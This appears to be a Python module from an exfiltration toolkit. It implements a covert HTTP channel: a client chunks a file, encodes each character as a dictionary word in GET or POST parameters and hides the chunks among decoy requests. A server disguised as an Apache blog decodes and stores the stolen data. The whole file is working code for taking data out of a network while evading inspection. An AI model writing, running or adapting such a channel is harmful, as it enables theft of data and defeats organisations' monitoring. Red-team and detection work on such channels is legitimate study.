import random
import urllib

from scapy.layers import http

import exfilkit as lpz
from exfilkit import methods


ENCODING_TABLE = {
    '0': 'radio',
    '1': 'spoke',
    '2': 'thick',
    '3': 'human',
    '4': 'atom',
    '5': 'effect',
    '6': 'electric',
    '7': 'expect',
    '8': 'bone',
    '9': 'rail',
    'a': 'imagine',
    'b': 'provide',
    'c': 'agree',
    'd': 'thus',
    'e': 'gentle',
    'f': 'woman',
    'g': 'captain',
    'h': 'guess',
    'i': 'necessary',
    'j': 'sharp',
    'k': 'wing',
    'l': 'create',
    'm': 'neighbor',
    'n': 'wash',
    'o': 'condition',
    'p': 'feed',
    'q': 'tool',
    'r': 'total',
    's': 'basic',
    't': 'smell',
    'u': 'valley',
    'v': 'nor',
    'w': 'double',
    'x': 'seat',
    'y': 'continue',
    'z': 'block',
    'A': 'chart',
    'B': 'hat',
    'C': 'sell',
    'D': 'success',
    'E': 'company',
    'F': 'subtract',
    'G': 'event',
    'H': 'particular',
    'I': 'deal',
    'J': 'swim',
    'K': 'term',
    'L': 'opposite',
    'M': 'wife',
    'N': 'shoe',
    'O': 'shoulder',
    'P': 'spread',
    'Q': 'arrange',
    'R': 'camp',
    'S': 'invent',
    'T': 'cotton',
    'U': 'born',
    'V': 'determine',
    'W': 'quart',
    'X': 'nine',
    'Y': 'truck',
    'Z': 'noise',
    '!': 'level',
    '"': 'chance',
    '#': 'gather',
    '$': 'shop',
    '%': 'stretch',
    '&': 'throw',
    "'": 'shine',
    '(': 'property',
    ')': 'column',
    '*': 'molecule',
    '+': 'select',
    ',': 'wrong',
    '-': 'gray',
    '.': 'repeat',
    '/': 'require',
    ':': 'broad',
    ';': 'prepare',
    '<': 'salt',
    '=': 'nose',
    '>': 'plural',
    '?': 'anger',
    '@': 'claim',
    '[': 'bat',
    '\\': 'rather',
    ']': 'crowd',
    '^': 'corn',
    '_': 'compare',
    '`': 'poem',
    '{': 'history',
    '|': 'bell',
    '}': 'depend',
    '~': 'meat',
    ' ': 'rub',
    '\t': 'tube',
    '\n': 'addressing',
    '\r': 'corner',
}


RANDOM_WORDS = (
    'abortion',
    'abuse',
    'across',
    'addiction',
    'adults',
    'advantage',
    'adventure',
    'advertisement',
    'advised',
    'aids',
    'allow',
    'altogether',
    'amber',
    'antivirus',
    'antology',
    'anxious',
    'anybody',
    'appear',
    'appearance',
    'appears',
    'applicable',
    'approval',
    'approve',
    'approximately',
    'assembly',
    'assistant',
    'assisted',
    'attach',
    'attack',
    'automatically',
    'ave',
    'avenue',
    'aware',
    'bangladesh',
    'baseball',
    'basketball',
    'bend',
    'birth',
    'blast',
    'boat',
    'botswana',
    'bound',
    'box',
    'brain',
    'brake',
    'break',
    'breakfast',
    'bridge',
    'brother',
    'brunswick',
    'calcium',
    'calgary',
    'candles',
    'carry',
    'cast',
    'centers',
    'chain',
    'charge',
    'chose',
    'chrome',
    'classical',
    'clips',
    'closed',
    'clubs',
    'codes',
    'compared',
    'comparison',
    'completely',
    'compound',
    'computing',
    'concluded',
    'confidence',
    'congo',
    'constitute',
    'contacts',
    'counter',
    'covers',
    'criminal',
    'damage',
    'decided',
    'dedicated',
    'define',
    'delays',
    'delete',
    'demonstration',
    'des',
    'designs',
    'desperate',
    'determined',
    'developer',
    'dialog',
    'died',
    'difference',
    'direction',
    'disc',
    'discounted',
    'divine',
    'dog',
    'dollar',
    'domestic',
    'draft',
    'dream',
    'earlier',
    'ecology',
    'eight',
    'electrical',
    'element',
    'ends',
    'enhancement',
    'equal',
    'evening',
    'extended',
    'extension',
    'exterior',
    'facts',
    'failure',
    'faith',
    'falls',
    'false',
    'felt',
    'field',
    'fill',
    'films',
    'flag',
    'floor',
    'flower',
    'follows',
    'forces',
    'fort',
    'funny',
    'gamma',
    'gene',
    'generally',
    'glen',
    'golden',
    'gone',
    'governmental',
    'graduation',
    'graphic',
    'greatest',
    'greeting',
    'harry',
    'harvest',
    'hawaii',
    'headlines',
    'health',
    'hello',
    'hentai',
    'holding',
    'houston',
    'hudson',
    'iceland',
    'icon',
    'identified',
    'identify',
    'inch',
    'indiana',
    'indians',
    'institutions',
    'intensity',
    'interactive',
    'interim',
    'isolated',
    'issued',
    'jackson',
    'jesus',
    'justice',
    'keeping',
    'kinds',
    'kong',
    'lab',
    'land',
    'laser',
    'leaders',
    'leadership',
    'legs',
    'licenses',
    'lighting',
    'locally',
    'maintain',
    'manage',
    'manufactured',
    'manufacturers',
    'matching',
    'meeting',
    'membrane',
    'mental',
    'minnesota',
    'missing',
    'moment',
    'moms',
    'morocco',
    'mothers',
    'mouse',
    'moved',
    'movement',
    'named',
    'nascar',
    'native',
    'newport',
    'newsletters',
    'nuclear',
    'objects',
    'obtained',
    'offering',
    'olive',
    'oliver',
    'ontario',
    'opening',
    'opinions',
    'oregon',
    'owned',
    'pair',
    'pairs',
    'pardon',
    'parking',
    'passed',
    'pattern',
    'personnel',
    'pickup',
    'placed',
    'plants',
    'plastic',
    'played',
    'pocket',
    'pole',
    'portable',
    'posters',
    'powerful',
    'prague',
    'preservation',
    'previews',
    'printing',
    'priority',
    'private',
    'procedure',
    'produce',
    'professionals',
    'profit',
    'promote',
    'quarter',
    'quietly',
    'racing',
    'rain',
    'ranges',
    'rank',
    'reach',
    'readers',
    'recipes',
    'recommendations',
    'refused',
    'religious',
    'removing',
    'requests',
    'reserve',
    'returned',
    'russia',
    'sacred',
    'sailing',
    'satisfied',
    'savings',
    'scored',
    'seattle',
    'senate',
    'sensitivity',
    'separate',
    'sequence',
    'sexual',
    'share',
    'shield',
    'shirts',
    'signal',
    'single',
    'sitemap',
    'smiling',
    'snow',
    'somewhat',
    'sorry',
    'soul',
    'spider',
    'sponsor',
    'springfield',
    'stated',
    'statements',
    'stats',
    'steps',
    'stone',
    'streaming',
    'supper',
    'supplied',
    'syndicate',
    'synthesis',
    'tables',
    'taxes',
    'teams',
    'technological',
    'theatre',
    'tommy',
    'tourism',
    'trails',
    'tried',
    'truth',
    'turned',
    'undefined',
    'unemployment',
    'utils',
    'variable',
    'variations',
    'venues',
    'verizon',
    'viewed',
    'virus',
    'warranty',
    'watched',
    'weather',
    'weekend',
    'wellness',
    'whenever',
    'wholesale',
    'williams',
    'wisconsin',
    'workshop',
    'worst',
    'writing',
    'yesterday',
)


ENCODING_TABLE_INV = {v: k for k, v in ENCODING_TABLE.items()}


VALUES = (
    'true',
    'false',
    '0',
    '1',
)


def encode(value):
    value = str(value)
    result = ''
    for c in value:
        result += '&{}={}'.format(ENCODING_TABLE[c], random.choice(VALUES))
    return result[1:]


def decode(value):
    result = ''
    words = value.split('&')
    for w in words:
        try:
            result += ENCODING_TABLE_INV[w.split('=')[0]]
        except KeyError:
            break
    return result


class Server(methods.HTTPServer):

    RESPONSE_200 = (
        'HTTP/1.1 200 OK\r\n'
        'Content-Type: text/html\r\n'
        'Access-Control-Allow-Origin: *\r\n'
        'Last-Modified: Wed, 01 Jan 2020 00:00:00 GMT\r\n'
        'Connection: close\r\n'
        'Date: {}\r\n'
        'Pragma: no-cache\r\n'
        'Content-Length: {}\r\n'
        'Server: Apache\r\n\r\n'
    )
    RESPONSE_404 = (
        'HTTP/1.1 404 Not Found\r\n'
        'Content-Type: text/html\r\n'
        'Access-Control-Allow-Origin: *\r\n'
        'Last-Modified: Wed, 01 Jan 2020 00:00:00 GMT\r\n'
        'Connection: close\r\n'
        'Date: {}\r\n'
        'Pragma: no-cache\r\n'
        'Content-Length: {}\r\n'
        'Server: Apache\r\n\r\n'
    )

    def response_200(self):
        with open('templates/html/blog/article.html') as fil:
            content = fil.read()
        return self.RESPONSE_200.format(self.date_now_rfc_1123(), len(content)) + content

    def response_404(self):
        with open('templates/html/blog/404.html') as fil:
            content = fil.read()
        return self.RESPONSE_404.format(self.date_now_rfc_1123(), len(content)) + content

    def handle(self, request, client_address):
        data = self.receive(request)
        try:
            http_request = http.HTTPRequest(data)
        except ValueError:
            lpz.logger.debug(f'-> Failed to parse: {data}')
        else:
            encrypted = self.get_payload(http_request)
            if encrypted:
                decrypted = decode(encrypted).encode('utf8')
                if decrypted:
                    lpz.logger.info(f'-> Encrypted data: {encrypted}')
                    lpz.logger.info(f'-> Decrypted data: {decrypted}')
                    self.output_write(decrypted)
                else:
                    lpz.logger.info(f'-> Nothing to decrypt...')
            url = urllib.parse.urlparse(http_request.Path)
            if url.path == b'/':
                request.sendall(self.response_200().encode('utf8'))
            else:
                request.sendall(self.response_404().encode('utf8'))
            lpz.logger.info(f'-> Sent response to {client_address}')


class GETServer(Server):

    def get_payload(self, request):
        encrypted = None
        if request.Method.decode() == 'GET':
            encrypted = request.Path.decode()[2:]
        return encrypted


class POSTServer(Server):

    def get_payload(self, request):
        encrypted = None
        if request.Method.decode() == 'POST':
            encrypted = request.payload.load.decode()
        return encrypted


class Client(methods.TCPClient):

    CHUNK_SIZE = 10
    REQUEST_HTTP = None
    EOT = b'\r\n\r\n'

    def execute(self):
        infile = self.args['infile'].read().decode('utf8')
        queue = []
        chunks = [infile[i: i + self.CHUNK_SIZE] for i in range(0, len(infile), self.CHUNK_SIZE)]
        for chunk in chunks:
            lpz.logger.debug(f'Sending "{chunk}"')
            decoy_no = random.randint(1, self.RANDOM_DECOY)
            for i in range(1, decoy_no):
                words = [random.choice(RANDOM_WORDS) for i in range(1, self.CHUNK_SIZE)]
                output = '&'.join(['{}={}'.format(w, random.choice(VALUES)) for w in words])
                queue.append(output)
            queue.append(encode(chunk))
        for msg in queue:
            self.send(self.prepare_data(msg))


class GETClient(Client):

    REQUEST_HTTP = (
        'GET /?{} HTTP/1.1\r\n\r\n'
    )

    def prepare_data(self, data):
        return self.REQUEST_HTTP.format(data).encode('utf8')


class POSTClient(Client):

    REQUEST_HTTP = (
        'POST / HTTP/1.1\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        'Content-Length: {}\r\n\r\n'
        '{}\r\n\r\n'
    )

    def prepare_data(self, data):
        return self.REQUEST_HTTP.format(len(data), data).encode('utf8')
